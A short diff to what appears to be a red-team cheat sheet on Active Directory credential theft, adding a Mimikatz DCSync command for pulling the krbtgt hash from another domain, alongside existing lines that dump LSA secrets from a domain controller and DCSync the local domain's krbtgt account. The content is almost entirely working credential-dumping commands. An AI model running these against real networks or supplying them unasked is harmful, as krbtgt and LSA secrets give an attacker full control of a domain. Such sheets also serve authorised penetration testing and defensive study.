@@ -118,6 +118,8 @@ C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc-hostname>
 
 # DCSync: Domain Admin privileges required to run 
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+# DCsync for another domain
+C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt /domain:<fqdn_domain>" "exit"'
 ```
 ##### Credentials from Credential Vault
 ```powershell
